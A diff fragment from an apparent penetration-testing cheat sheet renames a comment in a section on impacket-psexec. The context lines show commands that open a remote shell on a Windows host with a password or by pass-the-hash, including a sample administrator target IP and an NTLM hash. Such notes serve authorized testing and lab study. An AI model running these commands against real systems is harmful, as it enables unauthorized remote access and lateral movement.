@@ -360,7 +360,7 @@ Replace the customqueries.json file located at `/home/username/.config/bloodhoun
   ```bash
   # Username/Password
   impacket-psexec <domain>/<username:'<password>@<IP>
-  # Hashes
+  # With Hash
   impacket-psexec administrator@10.10.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
   ```
 * **Password Policy**
